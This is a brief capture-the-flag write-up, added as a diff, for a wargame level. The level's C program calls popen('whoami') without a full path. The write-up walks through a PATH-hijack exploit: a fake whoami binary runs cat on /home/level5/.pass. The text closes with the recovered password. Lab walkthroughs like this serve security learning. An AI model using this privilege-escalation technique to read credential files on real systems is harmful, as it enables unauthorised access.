@@ -1,0 +1,38 @@
+we have source code:
+
+	#include <stdlib.h>
+	#include <stdio.h>
+
+	int main() {
+		char username[1024];
+		FILE* f = popen("whoami","r");
+		fgets(username, sizeof(username), f);
+		printf("Welcome %s", username);
+
+		return 0;
+	}
+
+-->> we have to open /home/level5/.pass instead of file whoami to get username.
+-->> to change variable PATH (environment variable )
+
+PATH is an environmental variable in Linux and other Unix-like operating systems that 
+tells the shell which directories to search for executable files in response to commands 
+issued by a user. Each user on a system can have a different PATH variable.
+
+-->> to see PATH: echo PATH (use `env` to see total environment variable)
+
+-->> create file /tmp/hehe/whoami.c (/tmp/hehe: optional)
+
+-->> file whoami.c with content:
+
+	#include <stdlib.h>
+
+	int main(){
+	  system("cat /home/level5/.pass");
+	  return 0;
+	}
+
+-->> in command line: gcc whoami.c -o whoami
+-->> run ./level04 to get password 
+
+-->> pass: DNLM3Vu0mZfX0pDd
